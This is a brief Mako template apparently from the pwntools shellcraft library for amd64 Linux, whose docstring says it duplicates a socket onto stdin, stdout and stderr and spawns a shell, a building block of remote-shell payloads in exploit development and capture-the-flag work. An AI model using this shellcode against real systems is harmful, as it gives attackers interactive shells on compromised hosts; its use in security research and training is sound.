<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.amd64 import linux %>
<%page args="sock = 'rbp'"/>
<%docstring>
Args: [sock (imm/reg) = rbp]
    Duplicates sock to stdin, stdout and stderr and spawns a shell.
</%docstring>


${linux.dup(sock)}

${linux.sh()}
